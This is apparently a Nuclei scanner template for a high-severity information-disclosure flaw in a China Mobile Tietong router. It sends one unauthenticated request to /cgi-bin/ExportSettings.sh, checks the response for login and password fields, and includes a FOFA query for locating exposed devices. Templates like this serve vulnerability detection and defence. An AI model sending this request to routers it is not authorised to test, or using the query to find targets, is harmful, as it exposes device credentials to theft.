id: zt-router-ExportSettings-disclosure
info:
  name: 中移铁通禹路由器信息泄露漏洞
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E8%B7%AF%E7%94%B1%E5%99%A8/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A%E7%A6%B9%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: title="互联世界 物联未来-登录"
  tags: 2024,router,iot,disclosure,zt-router

http:
  - raw:
      - |
        GET /cgi-bin/ExportSettings.sh HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'Login','Password','WebInit')
        condition: and